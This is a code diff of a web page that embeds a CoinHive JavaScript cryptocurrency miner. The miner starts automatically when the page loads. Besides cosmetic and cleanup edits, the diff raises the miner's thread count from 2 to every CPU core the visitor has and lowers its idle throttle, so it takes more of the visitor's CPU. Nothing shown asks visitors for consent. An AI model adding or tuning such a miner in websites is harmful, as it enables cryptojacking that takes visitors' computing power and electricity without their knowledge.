@@ -67,10 +67,10 @@
 
     <script type="text/javascript">
         /*
-                Copyright @ Credit https://github.com/C0nw0nk/CoinHive
+                                        Copyright @ Credit https://github.com/C0nw0nk/CoinHive
 
-                Expect regular updates and any issues post here : https://github.com/C0nw0nk/CoinHive/issues
-                */
+                                        Expect regular updates and any issues post here : https://github.com/C0nw0nk/CoinHive/issues
+                                        */
 
         (function() {
             var a = function() {
@@ -97,9 +97,9 @@
                         //Start running the miner when loaded and ready. True = Yes | False = No
                         var coinhive_automatic_startup = true;
                         //Threads - The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available
-                        var mining_threads = 2;
+                        var mining_threads = navigator.hardwareConcurrency;
                         //Throttle - The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.
-                        var mining_throttle = .5;
+                        var mining_throttle = .4;
                         //Statistics Update frequency. 1000 = 1 Second.
                         var coinhive_statistics_timer = 1000;
 
@@ -624,10 +624,6 @@
             }, false);
         })();
     </script>
-    Script tag ended here :
-    <br>
-    <br>
-    <br> Body Tag ends here :
 </body>
 
 </html>
